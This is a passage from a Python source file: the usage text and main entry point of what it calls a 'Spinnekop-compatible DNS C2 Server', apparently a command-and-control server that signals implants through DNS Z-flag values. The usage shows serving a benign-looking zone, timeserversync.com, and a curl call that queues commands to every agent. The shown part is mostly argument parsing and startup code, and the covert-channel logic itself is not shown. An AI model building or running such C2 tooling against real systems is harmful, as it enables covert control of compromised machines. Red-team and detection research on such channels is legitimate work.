  sudo python3 dns_zflag_server.py --zone timeserversync.com. --zone-ip 10.0.0.1

  # Dev mode — no root required (port 5053):
  python3 dns_zflag_server.py --port 5053 --log-level DEBUG

Queue Z-commands while running:
  curl -X POST http://localhost:8080/command \\
       -H "Content-Type: application/json" \\
       -d '{"agent_id": "*", "z_value": 2}'
        """
    )
    ap.add_argument("--config",    default=DEFAULT_CONFIG,
                    help=f"Path to dns_server.yaml (default: {DEFAULT_CONFIG})")
    ap.add_argument("--bind",      default=None)
    ap.add_argument("--port",      type=int, default=None)
    ap.add_argument("--zone",      default=None, help="Zone name")
    ap.add_argument("--zone-ip",   default=None, help="Zone IP address")
    ap.add_argument("--workers",   type=int, default=None)
    ap.add_argument("--log-level", default=None, choices=["DEBUG","INFO","WARN","ERROR"])
    ap.add_argument("--log-format",default=None, choices=["TEXT","JSON"])
    ap.add_argument("--metrics-port", type=int, default=None)
    ap.add_argument("--no-rate-limit",action="store_true")
    ap.add_argument("--packet-dump",  action="store_true")
    ap.add_argument("--capture",      action="store_true")
    ap.add_argument("--sim-fail",     type=float, default=None)
    args = ap.parse_args()

    # Load config from YAML if available, else use defaults
    if os.path.exists(args.config):
        cfg = ServerConfig.from_yaml(args.config)
    else:
        cfg = ServerConfig(yaml_config="")
        print(f"[warn] Config file not found: {args.config} — using defaults")

    # CLI overrides
    if args.bind:        cfg.bind_address    = args.bind
    if args.port:        cfg.port            = args.port
    if args.zone:        cfg.zone_name       = args.zone
    if args.zone_ip:     cfg.zone_ip         = args.zone_ip
    if args.workers:     cfg.max_workers     = args.workers
    if args.log_level:   cfg.log_level       = args.log_level
    if args.log_format:  cfg.log_format      = args.log_format
    if args.metrics_port:cfg.metrics_port    = args.metrics_port
    if args.no_rate_limit: cfg.rate_limit_enabled = False
    if args.packet_dump: cfg.packet_dump     = True
    if args.capture:     cfg.packet_capture  = True
    if args.sim_fail is not None:
        cfg.simulate_failures = args.sim_fail > 0
        cfg.failure_rate      = args.sim_fail

    # Initialize structured logger (NEW)
    log.initialize(level=cfg.log_level, fmt=cfg.log_format, output=cfg.log_output)
    log.info("Spinnekop-compatible DNS C2 Server initializing",
             version="2.0", config=args.config)

    # Start server
    srv = DNSZFlagServer(cfg)

    def _sig(sig, frame):
        log.info("Shutdown signal received", signal=sig)
        srv.shutdown()
        sys.exit(0)

    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    try:
        srv.start()
    except PermissionError:
        log.error("Cannot bind to port — run with sudo", port=cfg.port)
        sys.exit(1)
    except OSError as e:
        log.error("Server startup failed", error=str(e))
        sys.exit(1)